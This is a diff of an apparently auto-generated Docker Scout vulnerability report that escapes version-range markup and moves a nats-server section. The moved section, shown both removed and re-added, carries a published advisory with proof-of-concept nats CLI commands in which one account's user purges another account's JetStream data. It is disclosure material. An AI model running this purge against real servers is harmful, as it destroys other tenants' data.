@@ -872,7 +870,7 @@ If errors returned from MarshalJSON methods contain user controlled data, they m
 <a href="https://scout.docker.com/v/CVE-2025-61724?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--61724" src="https://img.shields.io/badge/CVE--2025--61724-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
@@ -889,7 +887,7 @@ The Reader.ReadResponse function constructs a response string through repeated s
 <a href="https://scout.docker.com/v/CVE-2025-58189?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58189" src="https://img.shields.io/badge/CVE--2025--58189-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
@@ -906,7 +904,7 @@ When Conn.Handshake fails during ALPN negotiation the error contains attacker co
 <a href="https://scout.docker.com/v/CVE-2025-58186?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58186" src="https://img.shields.io/badge/CVE--2025--58186-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
@@ -923,7 +921,7 @@ Despite HTTP headers having a default limit of 1MB, the number of cookies that c
 <a href="https://scout.docker.com/v/CVE-2025-58185?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58185" src="https://img.shields.io/badge/CVE--2025--58185-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.033%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
@@ -940,7 +938,7 @@ Parsing a maliciously crafted DER payload could allocate large amounts of memory
 <a href="https://scout.docker.com/v/CVE-2025-47912?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--47912" src="https://img.shields.io/badge/CVE--2025--47912-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
@@ -957,7 +955,7 @@ The Parse function permits values other than IPv6 addresses to be included in sq
 <a href="https://scout.docker.com/v/CVE-2023-45284?s=golang&n=stdlib&t=golang&vr=%3C1.20.11"><img alt="medium : CVE--2023--45284" src="https://img.shields.io/badge/CVE--2023--45284-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.20.11</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.20.11</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.20.11</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
@@ -978,7 +976,7 @@ With fix, IsLocal now correctly reports these names as non-local.
 <a href="https://scout.docker.com/v/CVE-2023-39326?s=golang&n=stdlib&t=golang&vr=%3C1.20.12"><img alt="medium : CVE--2023--39326" src="https://img.shields.io/badge/CVE--2023--39326-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.20.12</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.20.12</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.20.12</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
@@ -999,7 +997,7 @@ Chunk extensions are a little-used HTTP feature which permit including additiona
 <a href="https://scout.docker.com/v/CVE-2023-29409?s=golang&n=stdlib&t=golang&vr=%3C1.19.12"><img alt="medium : CVE--2023--29409" src="https://img.shields.io/badge/CVE--2023--29409-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.12</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.12</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.12</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.112%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
@@ -1020,7 +1018,7 @@ Based on a survey of publicly trusted RSA keys, there are currently only three c
 <a href="https://scout.docker.com/v/CVE-2023-24532?s=golang&n=stdlib&t=golang&vr=%3C1.19.7"><img alt="medium : CVE--2023--24532" src="https://img.shields.io/badge/CVE--2023--24532-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.19.7</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.19.7</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.19.7</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
@@ -1058,7 +1056,7 @@ HTTP/2 server connections contain a cache of HTTP header keys sent by the client
 <a href="https://scout.docker.com/v/CVE-2025-58183?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"><img alt="medium : CVE--2025--58183" src="https://img.shields.io/badge/CVE--2025--58183-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.24.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.24.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.24.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
@@ -1075,7 +1073,7 @@ tar.Reader does not set a maximum size on the number of sparse region data block
 <a href="https://scout.docker.com/v/CVE-2024-34155?s=golang&n=stdlib&t=golang&vr=%3C1.22.7"><img alt="medium : CVE--2024--34155" src="https://img.shields.io/badge/CVE--2024--34155-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.22.7</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.22.7</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.22.7</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.073%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
@@ -1092,7 +1090,7 @@ Calling any of the Parse functions on Go source code which contains deeply neste
 <a href="https://scout.docker.com/v/CVE-2023-45289?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"><img alt="medium : CVE--2023--45289" src="https://img.shields.io/badge/CVE--2023--45289-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.21.8</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.21.8</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.21.8</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.454%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
@@ -1111,7 +1109,7 @@ A maliciously crafted HTTP redirect could cause sensitive headers to be unexpect
 <a href="https://scout.docker.com/v/CVE-2025-22866?s=golang&n=stdlib&t=golang&vr=%3C1.22.12"><img alt="medium : CVE--2025--22866" src="https://img.shields.io/badge/CVE--2025--22866-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
 
 <table>
-<tr><td>Affected range</td><td><code><1.22.12</code></td></tr>
+<tr><td>Affected range</td><td><code>&lt;1.22.12</code></td></tr>
 <tr><td>Fixed version</td><td><code>1.22.12</code></td></tr>
 <tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
 <tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
@@ -1121,303 +1119,6 @@ A maliciously crafted HTTP redirect could cause sensitive headers to be unexpect
 <blockquote>
 
 Due to the usage of a variable time instruction in the assembly implementation of an internal function, a small number of bits of secret scalars are leaked on the ppc64le architecture. Due to the way this function is used, we do not believe this leakage is enough to allow recovery of the private key when P-256 is used in any well known protocols.
-
-</blockquote>
-</details>
-</details></td></tr>
-
-<tr><td valign="top">
-<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/nats-io/nats-server/v2</strong> <code>2.9.0</code> (golang)</summary>
-
-<small><code>pkg:golang/github.com/nats-io/nats-server@2.9.0#v2</code></small><br/>
-<a href="https://scout.docker.com/v/CVE-2025-30215?s=github&n=v2&ns=github.com%2Fnats-io%2Fnats-server&t=golang&vr=%3E%3D2.2.0%2C%3C2.10.27"><img alt="critical 9.6: CVE--2025--30215" src="https://img.shields.io/badge/CVE--2025--30215-lightgrey?label=critical%209.6&labelColor=8b1924"/></a> <i>Improper Authorization</i>
-
-<table>
-<tr><td>Affected range</td><td><code>>=2.2.0<br/><2.10.27</code></td></tr>
-<tr><td>Fixed version</td><td><code>2.10.27</code></td></tr>
-<tr><td>CVSS Score</td><td><code>9.6</code></td></tr>
-<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H</code></td></tr>
-<tr><td>EPSS Score</td><td><code>0.053%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-## Advisory
-
-The management of JetStream assets happens with messages in the `$JS.` subject namespace in the system account; this is partially exposed into regular accounts to allow account holders to manage their assets.
-
-Some of the JS API requests were missing access controls, allowing any user with JS management permissions in any account to perform certain administrative actions on any JS asset in any other account. At least one of the unprotected APIs allows for data destruction. None of the affected APIs allow disclosing stream contents.
-
-### Affected versions
-
-NATS Server:
- * Version 2 from v2.2.0 onwards, prior to v2.11.1 or v2.10.27
-
------
-
-## Original Report
-
-(Lightly edited to confirm some supposition and in the summary to use past tense)
-
-### Summary
-
-nats-server did not include authorization checks on 4 separate admin-level JetStream APIs: account purge, server remove,  account stream move, and  account stream cancel-move.
-
-In all cases, APIs are not properly restricted to system-account users. Instead, _any_ authorized user can execute the APIs, including across account boundaries, as long as the current user merely has permission to publish on `$JS.>`.
-
-Only the first seems to be of highest severity. All are included in this single report as they seem likely to have the same underlying root cause.
-
-Reproduction of the `ACCOUNT.PURGE` case is below. The others are like it.
-
-
-### Details & Impact
-
-#### Issue 1: `$JS.API.ACCOUNT.PURGE.*`
-
-Any user may perform an account purge of any other account (including their own).
-
-Risk: total destruction of Jetstream configuration and data.
-
-
-#### Issue 2: `$JS.API.SERVER.REMOVE`
-
-Any user may remove servers from Jetstream clusters.
-
-Risk: Loss of data redundancy, reduction of service quality.
-
-
-#### Issue 3: `$JS.API.ACCOUNT.STREAM.MOVE.*.*` and `CANCEL_MOVE`
-
-Any user may cause streams to be moved between servers.
-
-Risk: loss of control of data provenance, reduced service quality during move, enumeration of account and/or stream names.
-
-Similarly for `$JS.API.ACCOUNT.STREAM.CANCEL_MOVE.*.*`
-
-
-#### Mitigations
-
-It appears that users without permission to publish on `$JS.API.ACCOUNT.>` or `$JS.API.SERVER.>` are unable to execute the above APIs.
-
-Unfortunately, in many configurations, an 'admin' user for a single account will be given permissions for `$JS.>` (or simply `>`), which allows the improper access to the system APIs above.
-
-
-#### Scope of impact
-
-Issues 1 and 3 both cross boundaries between accounts, violating promised account isolation. All 3 allow system level access to non-system account users.
-
-While I cannot speak to what authz configurations are actually found in the wild, per the discussion in Mitigations above, it seems likely that at least some configurations are vulnerable.
-
-
-#### Additional notes
-
-It appears that `$JS.API.META.LEADER.STEPDOWN` does properly restrict to system account users. As such, this may be a pattern for how to properly authorize these other APIs.
-
-
-
-### PoC
-
-#### Environment
-
-Tested with:
-nats-server 2.10.26 (installed via homebrew)
-nats cli 0.1.6 (installed via homebrew)
-macOS 13.7.4
-
-
-#### Reproduction steps
-
-```
-$ nats-server --version
-nats-server: v2.10.26
-
-$ nats --version
-0.1.6
-
-$ cat nats-server.conf
-listen: '0.0.0.0:4233'
-jetstream: {
-  store_dir: './tmp'
-}
-accounts: {
-  '$SYS': {
-    users: [{user: 'sys', password: 'sys'}]
-  },
-  'TEST': {
-    jetstream: true,
-    users: [{user: 'a', password: 'a'}]
-  },
-  'TEST2': {
-    jetstream: true,
-    users: [{user: 'b', password: 'b'}]
-  }
-}
-
-$ nats-server -c ./nats-server.conf
-...
-[90608] 2025/03/02 11:43:18.494663 [INF] Using configuration file: ./nats-server.conf
-...
-[90608] 2025/03/02 11:43:18.496395 [INF] Listening for client connections on 0.0.0.0:4233
-...
-
-# Authentication is effectively enabled by the server:
-$ nats -s nats://localhost:4233 account info
-nats: error: setup failed: nats: Authorization Violation
-
-$ nats -s nats://localhost:4233 account info --user sys --password wrong
-nats: error: setup failed: nats: Authorization Violation
-
-$ nats -s nats://localhost:4233 account info --user a --password wrong
-nats: error: setup failed: nats: Authorization Violation
-
-$ nats -s nats://localhost:4233 account info --user b --password wrong
-nats: error: setup failed: nats: Authorization Violation
-
-# Valid credentials work, and users properly matched to accounts:
-$ nats -s nats://localhost:4233 account info --user sys --password sys
-Account Information
-                      User: sys
-                   Account: $SYS
-...
-
-$ nats -s nats://localhost:4233 account info --user a --password a
-Account Information
-                           User: a
-                        Account: TEST
-...
-
-$ nats -s nats://localhost:4233 account info --user b --password b
-Account Information
-                           User: b
-                        Account: TEST2
-...
-
-# Add a stream and messages to account TEST (user 'a'):
-$ nats -s nats://localhost:4233 --user a --password a stream add stream1 --subjects s1 --storage file --defaults
-Stream stream1 was created
-...
-
-$ nats -s nats://localhost:4233 --user a --password a publish s1 --count 3 "msg {{Count}}"
-11:50:05 Published 5 bytes to "s1"
-11:50:05 Published 5 bytes to "s1"
-11:50:05 Published 5 bytes to "s1"
-
-# Messages are correctly persisted on account TEST, and not on TEST2:
-$ nats -s nats://localhost:4233 --user a --password a stream ls
-╭───────────────────────────────────────────────────────────────────────────────╮
-│                                    Streams                                    │
-├─────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
-│ Name    │ Description │ Created             │ Messages │ Size  │ Last Message │
-├─────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
-│ stream1 │             │ 2025-03-02 11:48:49 │ 3        │ 111 B │ 46.01s       │
-╰─────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯
-
-$ nats -s nats://localhost:4233 --user b --password b stream ls
-No Streams defined
-
-$ du -h tmp/jetstream
-  0B	tmp/jetstream/TEST/streams/stream1/obs
-8.0K	tmp/jetstream/TEST/streams/stream1/msgs
- 16K	tmp/jetstream/TEST/streams/stream1
- 16K	tmp/jetstream/TEST/streams
- 16K	tmp/jetstream/TEST
- 16K	tmp/jetstream
-
-# User b (account TEST2) sends a PURGE command for account TEST (user a).
-# According to the source comments, user b shouldn't even be able to purge it's own account, much less another one.
-$ nats -s nats://localhost:4233 --user b --password b request '$JS.API.ACCOUNT.PURGE.TEST' ''
-11:54:50 Sending request on "$JS.API.ACCOUNT.PURGE.TEST"
-11:54:50 Received with rtt 1.528042ms
-{"type":"io.nats.jetstream.api.v1.account_purge_response","initiated":true}
-
-# From nats-server in response to the purge request:
-[90608] 2025/03/02 11:54:50.277144 [INF] Purge request for account TEST (streams: 1, hasAccount: true)
-
-# And indeed, the stream data is gone on account TEST:
-$ du -h tmp/jetstream
-  0B	tmp/jetstream
-
-$ nats -s nats://localhost:4233 --user a --password a stream ls
-No Streams defined
-
-```
-
-</blockquote>
-</details>
-
-<a href="https://scout.docker.com/v/CVE-2023-47090?s=github&n=v2&ns=github.com%2Fnats-io%2Fnats-server&t=golang&vr=%3E%3D2.2.0%2C%3C2.9.23"><img alt="high : CVE--2023--47090" src="https://img.shields.io/badge/CVE--2023--47090-lightgrey?label=high%20&labelColor=e25d68"/></a> <i>Authentication Bypass by Primary Weakness</i>
-
-<table>
-<tr><td>Affected range</td><td><code>>=2.2.0<br/><2.9.23</code></td></tr>
-<tr><td>Fixed version</td><td><code>2.9.23</code></td></tr>
-<tr><td>EPSS Score</td><td><code>0.212%</code></td></tr>
-<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
-</table>
-
-<details><summary>Description</summary>
-<blockquote>
-
-## Background
-
-NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.
-
-NATS users exist within accounts, and once using accounts, the old authorization block is not applicable.
-
-
-## Problem Description
-
-Without any authorization rules in the nats-server, users can connect without authentication.
-
-Before nats-server 2.2.0, all authentication and authorization rules for a nats-server lived in an "authorization" block, defining users.  With nats-server 2.2.0 all users live inside accounts.  When using the authorization block, whose syntax predates this, those users will be placed into the implicit global account, "$G".  Users inside accounts go into the newer "accounts" block.
-
-If an "accounts" block is defined, in simple deployment scenarios this is often used only to enable client access to the system account.  When the only account added is the system account "$SYS", the nats-server would create an implicit user in "$G" and set it as the `no_auth_user` account, enabling the same "without authentication" logic as without any rules.
-
-This preserved the ability to connect simply, and then add one authenticated login for system access.
-
-But with an "authorization" block, this is wrong.  Users exist in the global account, with login rules.  And in simple testing, they might still connect fine without administrators seeing that authentication has been disabled.
-
-The blind-spot on our part came from encouraging and documenting a switch to using only "accounts", instead of "authorization".
-
-In the fixed versions, using an "authorization" block will inhibit the implicit creation of a "$G" user and setting it as the `no_auth_user` target.  In unfixed versions, just creating a second account, with no users, will also inhibit this behavior.
-
-
-## Affected versions
-
-NATS Server:
- * 2.2.0 up to and including 2.9.22 and 2.10.1
- * Fixed with nats-io/nats-server: 2.10.2 and backported to 2.9.23
-
-
-## Workarounds
-
-In the "accounts" block, define a second non-system account, leave it empty.
-
-    accounts {
-        SYS: {
-            users: [
-                { user: sysuser, password: makemeasandwich }
-            ]
-        }
-        DUMMY: {}  # for security, before 2.10.2
-    }
-    system_account: SYS
-
-
-## Solution
-
-Any one of these:
-
- 1. Upgrade the NATS server to at least 2.10.2 (or 2.9.23)
- 2. Or define a dummy account
- 3. Or complete the migration of authorization entries to be inside a named account in the "accounts" block
-
-
-## Credits
-
-Problem reported by Alex Herrington.  
-Addressed publicly in a GitHub Discussion prior to this advisory.
 
 </blockquote>
 </details>
@@ -1721,13 +1422,310 @@ Addressed publicly in a GitHub Discussion prior to this advisory.
 </details></td></tr>
 
 <tr><td valign="top">
+<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/nats-io/nats-server/v2</strong> <code>2.9.0</code> (golang)</summary>
+
+<small><code>pkg:golang/github.com/nats-io/nats-server@2.9.0#v2</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2025-30215?s=github&n=v2&ns=github.com%2Fnats-io%2Fnats-server&t=golang&vr=%3E%3D2.2.0%2C%3C2.10.27"><img alt="critical 9.6: CVE--2025--30215" src="https://img.shields.io/badge/CVE--2025--30215-lightgrey?label=critical%209.6&labelColor=8b1924"/></a> <i>Improper Authorization</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.2.0<br/><2.10.27</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.10.27</code></td></tr>
+<tr><td>CVSS Score</td><td><code>9.6</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.053%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+## Advisory
+
+The management of JetStream assets happens with messages in the `$JS.` subject namespace in the system account; this is partially exposed into regular accounts to allow account holders to manage their assets.
+
+Some of the JS API requests were missing access controls, allowing any user with JS management permissions in any account to perform certain administrative actions on any JS asset in any other account. At least one of the unprotected APIs allows for data destruction. None of the affected APIs allow disclosing stream contents.
+
+### Affected versions
+
+NATS Server:
+ * Version 2 from v2.2.0 onwards, prior to v2.11.1 or v2.10.27
+
+-----
+
+## Original Report
+
+(Lightly edited to confirm some supposition and in the summary to use past tense)
+
+### Summary
+
+nats-server did not include authorization checks on 4 separate admin-level JetStream APIs: account purge, server remove,  account stream move, and  account stream cancel-move.
+
+In all cases, APIs are not properly restricted to system-account users. Instead, _any_ authorized user can execute the APIs, including across account boundaries, as long as the current user merely has permission to publish on `$JS.>`.
+
+Only the first seems to be of highest severity. All are included in this single report as they seem likely to have the same underlying root cause.
+
+Reproduction of the `ACCOUNT.PURGE` case is below. The others are like it.
+
+
+### Details & Impact
+
+#### Issue 1: `$JS.API.ACCOUNT.PURGE.*`
+
+Any user may perform an account purge of any other account (including their own).
+
+Risk: total destruction of Jetstream configuration and data.
+
+
+#### Issue 2: `$JS.API.SERVER.REMOVE`
+
+Any user may remove servers from Jetstream clusters.
+
+Risk: Loss of data redundancy, reduction of service quality.
+
+
+#### Issue 3: `$JS.API.ACCOUNT.STREAM.MOVE.*.*` and `CANCEL_MOVE`
+
+Any user may cause streams to be moved between servers.
+
+Risk: loss of control of data provenance, reduced service quality during move, enumeration of account and/or stream names.
+
+Similarly for `$JS.API.ACCOUNT.STREAM.CANCEL_MOVE.*.*`
+
+
+#### Mitigations
+
+It appears that users without permission to publish on `$JS.API.ACCOUNT.>` or `$JS.API.SERVER.>` are unable to execute the above APIs.
+
+Unfortunately, in many configurations, an 'admin' user for a single account will be given permissions for `$JS.>` (or simply `>`), which allows the improper access to the system APIs above.
+
+
+#### Scope of impact
+
+Issues 1 and 3 both cross boundaries between accounts, violating promised account isolation. All 3 allow system level access to non-system account users.
+
+While I cannot speak to what authz configurations are actually found in the wild, per the discussion in Mitigations above, it seems likely that at least some configurations are vulnerable.
+
+
+#### Additional notes
+
+It appears that `$JS.API.META.LEADER.STEPDOWN` does properly restrict to system account users. As such, this may be a pattern for how to properly authorize these other APIs.
+
+
+
+### PoC
+
+#### Environment
+
+Tested with:
+nats-server 2.10.26 (installed via homebrew)
+nats cli 0.1.6 (installed via homebrew)
+macOS 13.7.4
+
+
+#### Reproduction steps
+
+```
+$ nats-server --version
+nats-server: v2.10.26
+
+$ nats --version
+0.1.6
+
+$ cat nats-server.conf
+listen: '0.0.0.0:4233'
+jetstream: {
+  store_dir: './tmp'
+}
+accounts: {
+  '$SYS': {
+    users: [{user: 'sys', password: 'sys'}]
+  },
+  'TEST': {
+    jetstream: true,
+    users: [{user: 'a', password: 'a'}]
+  },
+  'TEST2': {
+    jetstream: true,
+    users: [{user: 'b', password: 'b'}]
+  }
+}
+
+$ nats-server -c ./nats-server.conf
+...
+[90608] 2025/03/02 11:43:18.494663 [INF] Using configuration file: ./nats-server.conf
+...
+[90608] 2025/03/02 11:43:18.496395 [INF] Listening for client connections on 0.0.0.0:4233
+...
+
+# Authentication is effectively enabled by the server:
+$ nats -s nats://localhost:4233 account info
+nats: error: setup failed: nats: Authorization Violation
+
+$ nats -s nats://localhost:4233 account info --user sys --password wrong
+nats: error: setup failed: nats: Authorization Violation
+
+$ nats -s nats://localhost:4233 account info --user a --password wrong
+nats: error: setup failed: nats: Authorization Violation
+
+$ nats -s nats://localhost:4233 account info --user b --password wrong
+nats: error: setup failed: nats: Authorization Violation
+
+# Valid credentials work, and users properly matched to accounts:
+$ nats -s nats://localhost:4233 account info --user sys --password sys
+Account Information
+                      User: sys
+                   Account: $SYS
+...
+
+$ nats -s nats://localhost:4233 account info --user a --password a
+Account Information
+                           User: a
+                        Account: TEST
+...
+
+$ nats -s nats://localhost:4233 account info --user b --password b
+Account Information
+                           User: b
+                        Account: TEST2
+...
+
+# Add a stream and messages to account TEST (user 'a'):
+$ nats -s nats://localhost:4233 --user a --password a stream add stream1 --subjects s1 --storage file --defaults
+Stream stream1 was created
+...
+
+$ nats -s nats://localhost:4233 --user a --password a publish s1 --count 3 "msg {{Count}}"
+11:50:05 Published 5 bytes to "s1"
+11:50:05 Published 5 bytes to "s1"
+11:50:05 Published 5 bytes to "s1"
+
+# Messages are correctly persisted on account TEST, and not on TEST2:
+$ nats -s nats://localhost:4233 --user a --password a stream ls
+╭───────────────────────────────────────────────────────────────────────────────╮
+│                                    Streams                                    │
+├─────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
+│ Name    │ Description │ Created             │ Messages │ Size  │ Last Message │
+├─────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
+│ stream1 │             │ 2025-03-02 11:48:49 │ 3        │ 111 B │ 46.01s       │
+╰─────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯
+
+$ nats -s nats://localhost:4233 --user b --password b stream ls
+No Streams defined
+
+$ du -h tmp/jetstream
+  0B	tmp/jetstream/TEST/streams/stream1/obs
+8.0K	tmp/jetstream/TEST/streams/stream1/msgs
+ 16K	tmp/jetstream/TEST/streams/stream1
+ 16K	tmp/jetstream/TEST/streams
+ 16K	tmp/jetstream/TEST
+ 16K	tmp/jetstream
+
+# User b (account TEST2) sends a PURGE command for account TEST (user a).
+# According to the source comments, user b shouldn't even be able to purge it's own account, much less another one.
+$ nats -s nats://localhost:4233 --user b --password b request '$JS.API.ACCOUNT.PURGE.TEST' ''
+11:54:50 Sending request on "$JS.API.ACCOUNT.PURGE.TEST"
+11:54:50 Received with rtt 1.528042ms
+{"type":"io.nats.jetstream.api.v1.account_purge_response","initiated":true}
+
+# From nats-server in response to the purge request:
+[90608] 2025/03/02 11:54:50.277144 [INF] Purge request for account TEST (streams: 1, hasAccount: true)
+
+# And indeed, the stream data is gone on account TEST:
+$ du -h tmp/jetstream
+  0B	tmp/jetstream
+
+$ nats -s nats://localhost:4233 --user a --password a stream ls
+No Streams defined
+
+```
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2023-47090?s=github&n=v2&ns=github.com%2Fnats-io%2Fnats-server&t=golang&vr=%3E%3D2.2.0%2C%3C2.9.23"><img alt="high : CVE--2023--47090" src="https://img.shields.io/badge/CVE--2023--47090-lightgrey?label=high%20&labelColor=e25d68"/></a> <i>Authentication Bypass by Primary Weakness</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.2.0<br/><2.9.23</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.9.23</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.212%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+## Background
+
+NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.
+
+NATS users exist within accounts, and once using accounts, the old authorization block is not applicable.
+
+
+## Problem Description
+
+Without any authorization rules in the nats-server, users can connect without authentication.
+
+Before nats-server 2.2.0, all authentication and authorization rules for a nats-server lived in an "authorization" block, defining users.  With nats-server 2.2.0 all users live inside accounts.  When using the authorization block, whose syntax predates this, those users will be placed into the implicit global account, "$G".  Users inside accounts go into the newer "accounts" block.
+
+If an "accounts" block is defined, in simple deployment scenarios this is often used only to enable client access to the system account.  When the only account added is the system account "$SYS", the nats-server would create an implicit user in "$G" and set it as the `no_auth_user` account, enabling the same "without authentication" logic as without any rules.
+
+This preserved the ability to connect simply, and then add one authenticated login for system access.
+
+But with an "authorization" block, this is wrong.  Users exist in the global account, with login rules.  And in simple testing, they might still connect fine without administrators seeing that authentication has been disabled.
+
+The blind-spot on our part came from encouraging and documenting a switch to using only "accounts", instead of "authorization".
+
+In the fixed versions, using an "authorization" block will inhibit the implicit creation of a "$G" user and setting it as the `no_auth_user` target.  In unfixed versions, just creating a second account, with no users, will also inhibit this behavior.
+
+
+## Affected versions
+
+NATS Server:
+ * 2.2.0 up to and including 2.9.22 and 2.10.1
+ * Fixed with nats-io/nats-server: 2.10.2 and backported to 2.9.23
+
+
+## Workarounds
+
+In the "accounts" block, define a second non-system account, leave it empty.
+
+    accounts {
+        SYS: {
+            users: [
+                { user: sysuser, password: makemeasandwich }
+            ]
+        }
+        DUMMY: {}  # for security, before 2.10.2
+    }
+    system_account: SYS
+
+
+## Solution
+
+Any one of these:
+
+ 1. Upgrade the NATS server to at least 2.10.2 (or 2.9.23)
+ 2. Or define a dummy account
